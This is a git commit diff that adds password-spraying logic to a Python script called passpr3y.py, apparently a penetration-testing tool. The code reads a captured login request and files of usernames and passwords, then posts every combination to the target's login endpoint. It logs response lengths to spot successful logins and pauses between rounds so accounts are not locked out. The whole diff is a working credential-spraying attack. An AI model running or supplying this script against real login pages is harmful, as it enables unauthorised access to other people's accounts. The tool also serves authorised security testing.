e92bb05ba4f70993a4b9df84802919575b82f620
Faisal Tameesh <ftameesh@depthsecurity.com>
2018-06-12 15:19:39 -0500

    Make requests and observe lengths

--- passpr3y.py
+++ passpr3y.py
@@ -1,9 +1,11 @@
 #!/usr/bin/python
 
 import requests
-import pprint
-import json
+import sys
+import time
 
+proxies = {'http' : 'http://10.10.110.100:8080'}
+sleepTimeMinutes = 0.25
 
 # Parse request file
 requestsFile = open('request.txt', 'r')
@@ -12,10 +14,41 @@ endPoint = lineList[0].split(' ')[1].strip()
 headerDict = dict(item.split(': ') for item in map(str.strip, lineList[1:-2]))
 dataDict = dict(item.split('=') for item in map(str.strip, lineList[-1].split('&')))
 requestsFile.close()
+if("USERPR3Y" not in dataDict.values() or "PASSPR3Y" not in dataDict.values()):
+    sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")
 
-r = requests.post("http://" + headerDict["Host"] + '/' + endPoint, \
-        headers=headerDict, data=dataDict, verify=False)
+# Parse usernames file
+usernamesFile = open('usernames.txt', 'r')
+usernamesList = map(str.strip, usernamesFile.readlines())
+usernamesFile.close()
 
-print len(r.content)
+# Parse passwords file
+passwordsFile = open('passwords.txt', 'r')
+passwordsList = map(str.strip, passwordsFile.readlines())
+passwordsFile.close()
 
+# Prepare injection points
+usernameKey = ""
+passwordKey = ""
+for key,value in dataDict.iteritems():
+    if value == "USERPR3Y":
+        usernameKey = key
+    elif value == "PASSPR3Y":
+        passwordKey = key
+
+# Spray
+for password in passwordsList:
+    for username in usernamesList:
+        # Load injection points
+        dataDict[usernameKey] = username
+        dataDict[passwordKey] = password
+        
+        # Attempt login
+        print "Attemping " + username + ':' + password
+        r = requests.post("http://" + headerDict["Host"] + endPoint, \
+                headers=headerDict, data=dataDict, proxies=proxies, verify=False)
+
+        # Examine response length
+        print len(r.content)
+    time.sleep(int(round(sleepTimeMinutes*60)))
 
